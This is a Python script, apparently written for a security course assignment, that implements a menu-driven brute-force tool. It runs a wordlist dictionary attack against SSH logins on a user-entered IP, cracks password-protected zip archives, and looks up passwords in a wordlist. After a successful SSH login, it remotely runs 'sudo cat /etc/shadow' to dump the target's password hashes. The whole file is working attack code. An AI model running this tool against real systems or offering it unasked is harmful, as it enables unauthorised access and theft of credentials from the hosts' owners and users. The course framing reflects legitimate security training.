#!/usr/bin/python3

# Script: Ops 401 Class 18 script
# Author: Paul Stroud
# Date of latest revision: 05/10/23
# Purpose: Brute force pt3
# Resources used: google, stackoverflow, github demo, chatgpt

# MAIN REQS:
# Add a new mode to your Python brute force tool that allows you to brute force attack a password-locked zip file.
# Use the zipfile library.
# Pass it the wordlist to test all words in the list against the password-locked zip file.

import zipfile  # for working with zip files

import sys      # for args and sys.exit() to kill the script
import time     # for time.sleep() timeout

import paramiko # for SSH connections and remote execution

### FUNCTIONS ####

# SSH connect to <host> on <port> using <username>:<pw>
def connect_ssh(host, username, pw, port=22):
    print(f"[{username}@{host}] Trying password '{pw}':   ", end="")
    
    # set up an SSH client object
    ssushi = paramiko.SSHClient()
    ssushi.set_missing_host_key_policy(paramiko.AutoAddPolicy)  
    
    try:  # attempt connection
      ssushi.connect(host, port, username, pw)  # attempt connection with given credentials
      print("SUCCESS!") # boom
      return ssushi     # return connection handle
    
    except paramiko.AuthenticationException:  # bad login
      print("fail")
      return None

    except KeyboardInterrupt:   # Ctrl+C interrupt
      print("\nStopped by user. Exiting...")
      sys.exit()

   

#### MAIN ####


try:    # grab parameters from script arguments
    wordlist = sys.argv[1]  # dictionary file
except: # incorrect number of args
    print("Please provide a wordlist file as the argument to this script.\n" \
          "Exiting...")
    sys.exit()


# menu loop
while True:
    time.sleep(1)
    print("\n>>> Brute Force Tool v3.0 <<<")
    print("Select the operation to perform:" \
          f"\n\t1. SSH Dictionary Attack" \
          f"\n\t2. Password Lookup" \
          f"\n\t3. Brute force a zip file" \
          "\n\t0. Exit")

    op = -1  # holds user input
    while not (op >= 0 and op <= 3):
      try:
         op = int(input("Enter a menu option (0-3): "))
      except KeyboardInterrupt:   # Ctrl+C
         print()
         sys.exit()
      except: # catch all for anything other than menu options or Ctrl+C
         print("Invalid input. Please try again.")

    if op == 0:
      print("Exiting the script...")
      sys.exit()  # kill the script
    else:
      if op == 1:   # password iterator
        ip = input("Enter target IP: ")
        user = input("Enter username for SSH login: ")

        print(f"Parsing {wordlist} as the wordlist file.")
        try:
            file = open(wordlist, "rt")
            for pw in file:   # iterate over each line/word in the wordlist
               ssh = connect_ssh(ip, user, pw.strip())  # try pw for SSH login
               if (ssh != None):  # valid SSH socket?
                  try:
                      print("\nDUMPING USER PW HASHES FROM /etc/shadow:")
                      # execute remote command to grab pw hashes
                      ssh_in, ssh_out, ssh_err = ssh.exec_command("sudo cat /etc/shadow | grep -v -e '*' -e '!' | awk -F ':' '{ print $1 \"\t\"  $2 }'")
                      print(ssh_out.read().decode("ASCII")) # decode as ASCII and dump to stdout
                      print("^^^ END OF HASHES ^^^")
                  
                  except Exception as exc:  # it's broken
                      print(f"Error retrieving password hashes. Exception: {exc}")
                  
                  break   # exit the loop after finding the right password

               time.sleep(1)  # delay before trying the next pw
        except FileNotFoundError: print(f"File {wordlist} does not exist")

      if op == 2:   # password lookup
        test = input("Input the password to look up: ")
        print(f"Looking for {test} in {wordlist}:")
        i = 0   # line counter
        print(f"Parsing {wordlist} as the wordlist file.")
        try:
            file = open(wordlist, "rt")
            for pw in file:
               pw1 = pw.strip()
               i += 1
               if (test == pw1):
                 print(f"MATCH FOUND!   Line {i}: {test} - {pw1}")
        except FileNotFoundError: print(f"File {wordlist} does not exist")

      if op == 3:   # brute force a zip file
        zip = input('Enter the zip archive to open (default = "test.zip")')
        zip = "test.zip" if zip == "" else zip
        print(f"Parsing {wordlist} as the wordlist file.")
        try:
            file = open(wordlist, "rt")
            for pw in file:   # iterate over each line/word in the wordlist
              pw1 = pw.strip()  # extract the actual password (remove leading/trailing characters)
              print(f"   {zip}:{pw1}", " " * (15 - len(pw1)), ">   ", sep="", end="")  # pad spaces for up to 15 chars
              try:
                  # attempt to extract files using the pw from wordlist
                  var = zipfile.ZipFile(zip).extractall(pwd=bytes(pw1, "UTF-8"))
                  # if no exceptions thrown, we are good!
                  print("SUCCESS")
                  break # stop iteration
              except Exception as exc:
                  # exception: first two words are "bad password"?
                  if (exc.args[0].split(' ')[0:2] == [ 'Bad', 'password' ]):
                    print("fail")
                  # for any other exceptions
                  else: print(f"Unknown error opening {zip}")
        except FileNotFoundError: print(f"File {wordlist} does not exist")
        
# end of script